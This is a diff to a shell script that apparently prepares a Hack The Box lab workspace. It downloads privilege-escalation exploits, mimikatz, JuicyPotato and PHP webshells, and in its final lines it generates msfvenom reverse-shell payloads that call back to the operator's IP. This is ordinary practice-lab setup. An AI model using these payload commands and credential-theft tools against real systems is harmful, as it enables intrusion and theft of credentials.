@@ -13,15 +13,16 @@ echo "Current HTB Box - $box"
 mkdir $box
 cd $box
 mkdir www smb ssh
-#echo ""
-echo -e "[!]\e[41mInstall Pre-requisites\e[0m[!] - Commented out by Default"
+echo ""
+echo -e "\e[41mInstall Pre-requisites\e[0m"
+echo -e "\e[41mAll Kali Tools Commented Out and so is Rust Install\e[0m"
 #sudo curl https://sh.rustup.rs -sSf | sh
-#cargo install rustscan
-#cargo install feroxbuster
+cargo install rustscan
+cargo install feroxbuster
 #sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
 #sudo pipx install git+https://github.com/Tib3rius/AutoRecon.git
 #sudo pip install one-lin3r
-echo  -e "[\e[41mCreating One-liners & SSH Keys\e[0m]"
+echo  -e "\e[41mDownloading Useful & Creating SSH Keys\e[0m"
 git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
 sed -i "s/10.0.0.1/$htbip/g" useful
 sed -i "s/10.10.10.97/$box/g" useful
@@ -30,7 +31,7 @@ ssh-keygen -t rsa -f id_rsa -q -P ""
 cd ..
 cat ssh/id_rsa.pub
 echo ""
-echo -e "[\e[41mDownloading Enum Scripts.\e[0m]"
+echo -e "\e[41mDownloading Enum Scripts.\e[0m"
 cd www
 git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
 git clone https://github.com/s0md3v/Arjun arjun
@@ -52,7 +53,7 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 cd ..
 echo ""
-echo -e "[\e[41mPulling Windows Exploits\e[0m]"
+echo -e "\e[41mPulling Windows Exploits\e[0m"
 git clone https://github.com/SecWiki/windows-kernel-exploits.git win-exploits
 cd win-exploits && rm -rf .git
 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
@@ -63,7 +64,7 @@ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix
 unzip mimikatz_trunk.zip && rm -rf mimikatz_trunk.zip
 cd ..
 echo ""
-echo -e "[\e[41mPulling WebShells\e[0m]"
+echo -e "\e[41mPulling WebShells\e[0m"
 mkdir webshells
 git clone https://github.com/ivan-sincek/php-reverse-shell.git tmp
 cd tmp
@@ -81,7 +82,7 @@ cd ..
 mkdir shells
 cd shells
 echo ""
-echo -e "[\e[41mCreating MSFVenom Shells\e[0m]"
+echo -e "\e[41mCreating MSFVenom Shells\e[0m"
 msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o rev-1234.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x64-1234.exe
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
